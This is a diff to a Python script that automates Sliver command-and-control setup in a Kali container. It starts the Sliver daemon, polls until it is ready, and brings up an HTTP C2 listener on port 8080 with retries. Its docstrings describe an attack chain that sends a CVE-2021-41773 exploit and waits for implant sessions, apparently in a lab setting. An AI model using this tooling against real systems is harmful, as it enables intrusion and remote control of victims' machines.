@@ -43,20 +43,53 @@ def is_port_open(port):
 
 def ensure_sliver_daemon():
     """Verify that the sliver-server daemon is active on port 31337.
-    If not active, starts the daemon in the background.
+    If not active, starts the daemon in the background and polls until
+    the gRPC control socket is accepting connections.
+
+    On fresh-boot containers, sliver-server can take 30-60 s to finish
+    its TLS / SQLite metadata initialisation before binding :31337 --
+    the previous fixed ``time.sleep(12)`` consistently raced past it,
+    so subsequent ``sliver-client --rc ...`` calls connected to a not-
+    yet-ready daemon and hung silently until sliver-client's internal
+    12 s gRPC timeout fired, returning empty stdout. Symptom downstream
+    was the listener silently failing to start.
     """
-    if not is_port_open(31337):
-        log("[*] Sliver daemon is not active. Starting sliver-server daemon...")
-        subprocess.Popen(
-            ["sliver-server", "daemon"],
-            stdout=subprocess.DEVNULL,
-            stderr=subprocess.DEVNULL,
-            start_new_session=True
-        )
-        log("[*] Waiting 12 seconds for Sliver daemon to initialize...")
-        time.sleep(12)
-    else:
+    if is_port_open(31337):
         log("[+] Sliver daemon is active.")
+        return
+
+    log("[*] Sliver daemon is not active. Starting sliver-server daemon...")
+    subprocess.Popen(
+        ["sliver-server", "daemon"],
+        stdout=subprocess.DEVNULL,
+        stderr=subprocess.DEVNULL,
+        start_new_session=True
+    )
+
+    # Generous timeout: on a first-ever build the daemon has to generate
+    # TLS certs + initialise the SQLite ops DB before binding :31337,
+    # which can push past 90 s on slower hosts. Subsequent runs hit the
+    # cached state and bind in 2-5 s, so this only costs the first cold
+    # boot after `docker compose build kali`.
+    DAEMON_READY_TIMEOUT = 180  # seconds
+    POLL_INTERVAL        = 2
+    log(f"[*] Waiting up to {DAEMON_READY_TIMEOUT} s for Sliver daemon gRPC :31337 to bind...")
+    deadline = time.time() + DAEMON_READY_TIMEOUT
+    while time.time() < deadline:
+        if is_port_open(31337):
+            elapsed = int(DAEMON_READY_TIMEOUT - (deadline - time.time()))
+            log(f"[+] Sliver daemon gRPC :31337 ready after ~{elapsed} s.")
+            # Brief grace period so the daemon finishes loading config /
+            # ops before the first sliver-client RPC lands on it.
+            time.sleep(3)
+            return
+        time.sleep(POLL_INTERVAL)
+
+    raise RuntimeError(
+        f"ensure_sliver_daemon: sliver-server did not bind :31337 within "
+        f"{DAEMON_READY_TIMEOUT} s. Check the daemon process is alive "
+        "(ps -ef | grep sliver-server) and inspect any startup errors."
+    )
 
 def ensure_sliver_client_configured():
     """Verify that sliver-client has at least one operator configuration imported.
@@ -79,21 +112,93 @@ def ensure_sliver_client_configured():
         log("[+] Sliver client configuration is active.")
 
 def ensure_sliver_listener():
-    """Verify that the HTTP C2 listener on port 8080 is active.
-    If not active, starts the listener via sliver-client.
+    """Verify (or start + verify) the HTTP C2 listener on port 8080.
+
+    Cold-daemon gRPC handshake on :31337 can take 12-20 s after
+    ``sliver-server daemon`` boots, so the original 10 s subprocess
+    timeout was firing routinely and the exception was treated as
+    non-fatal: the chain advanced, sent the CVE-2021-41773 exploit,
+    and then polled fruitlessly for 14 × 5 s before failing with the
+    misleading "no Sliver session/beacon" error.
+
+    We verify the listener with ``ss -ltn`` (TCP port binding on
+    :8080) instead of ``sliver-client jobs``. Reason: against a cold
+    daemon, ``sliver-client --rc ...`` sometimes returns empty stdout
+    without erroring -- the gRPC stream gets cut before the response
+    streams back, but the subprocess still exits 0. ``ss`` answers the
+    only question we actually care about ("is anything listening on
+    8080 inside this container?") without any gRPC round-trip and is
+    bulletproof.
+
+    Flow per attempt:
+      1. ``ss -ltn`` → if :8080 already bound, done.
+      2. Otherwise issue ``http -L 0.0.0.0 -l 8080`` via sliver-client
+         (the only call that actually needs gRPC).
+      3. Wait briefly (~2 s) for the listener thread to bind the port.
+      4. ``ss -ltn`` again → if :8080 bound, done.
+      5. Otherwise back off and retry (3 attempts total, 5/10 s).
+
+    Persistent failure raises ``RuntimeError`` so the chain aborts at
+    prereq time with a concrete remediation hint instead of wasting
+    70 s polling for sessions that can't arrive.
     """
-    cmd = ["sh", "-c", "echo 'jobs' > /tmp/list_jobs.rc && echo 'exit' >> /tmp/list_jobs.rc && sliver-client --rc /tmp/list_jobs.rc"]
-    try:
-        res = subprocess.run(cmd, capture_output=True, text=True, timeout=10)
-        if "8080" not in res.stdout:
-            log("[*] Sliver HTTP listener on port 8080 not active. Starting listener...")
-            start_cmd = ["sh", "-c", "echo 'http -l 8080' > /tmp/start_listener.rc && echo 'exit' >> /tmp/start_listener.rc && sliver-client --rc /tmp/start_listener.rc"]
-            subprocess.run(start_cmd, capture_output=True, text=True, timeout=10)
-            log("[+] Sliver HTTP listener on port 8080 started.")
-        else:
-            log("[+] Sliver HTTP listener on port 8080 is active.")
-    except Exception as e:
-        log(f"[-] Error checking/starting Sliver listener: {e}")
+    SUBPROCESS_TIMEOUT = 30
+    MAX_ATTEMPTS       = 3
+    BACKOFF_SECS       = [5, 10]
+    POST_START_WAIT    = 2
+
+    def _is_8080_bound() -> bool:
+        # ss is in iproute2; available in the kali image. The "*:8080" /
+        # ":::8080" patterns cover both ipv4 / ipv6 LISTEN lines.
+        try:
+            res = subprocess.run(["ss", "-ltn"], capture_output=True,
+                                 text=True, timeout=5)
+            return ":8080" in res.stdout
+        except Exception:
+            return False
+
+    def _start_listener() -> None:
+        cmd = ["sh", "-c",
+               "echo 'http -L 0.0.0.0 -l 8080' > /tmp/start_listener.rc && "
+               "echo 'exit'                    >> /tmp/start_listener.rc && "
+               "sliver-client --rc /tmp/start_listener.rc"]
+        subprocess.run(cmd, capture_output=True, text=True,
+                       timeout=SUBPROCESS_TIMEOUT)
+
+    last_err: str | None = None
+    for attempt in range(1, MAX_ATTEMPTS + 1):
+        try:
+            if _is_8080_bound():
+                log("[+] Sliver HTTP listener on port 8080 is active.")
+                return
+            log(f"[*] Sliver HTTP listener on :8080 not bound "
+                f"(attempt {attempt}/{MAX_ATTEMPTS}). Starting...")
+            _start_listener()
+            time.sleep(POST_START_WAIT)
+            if _is_8080_bound():
+                log("[+] Sliver HTTP listener on port 8080 started.")
+                return
+            last_err = "post-start verify: :8080 not bound in `ss -ltn`"
+            log(f"[-] Listener did not bind :8080 after start "
+                f"(attempt {attempt}/{MAX_ATTEMPTS})")
+        except subprocess.TimeoutExpired as e:
+            last_err = f"sliver-client timeout: {e}"
+            log(f"[-] sliver-client timed out after {SUBPROCESS_TIMEOUT} s "
+                f"(attempt {attempt}/{MAX_ATTEMPTS}); daemon gRPC slow")
+        except Exception as e:
+            last_err = f"{type(e).__name__}: {e}"
+            log(f"[-] unexpected listener error "
+                f"(attempt {attempt}/{MAX_ATTEMPTS}): {last_err}")
+
+        if attempt < MAX_ATTEMPTS:
+            time.sleep(BACKOFF_SECS[attempt - 1])
+
+    raise RuntimeError(
+        "ensure_sliver_listener: could not bind :8080 after "
+        f"{MAX_ATTEMPTS} attempts ({last_err}). "
+        "Check `sliver-server daemon` is responsive "
+        "(ss -ltn | grep 31337) and inspect /tmp/sliver-daemon.log."
+    )
 
 def ensure_beacon_compiled(kali_ip):
     """Verify that both target Sliver implants (session and beacon) are compiled at /tmp.
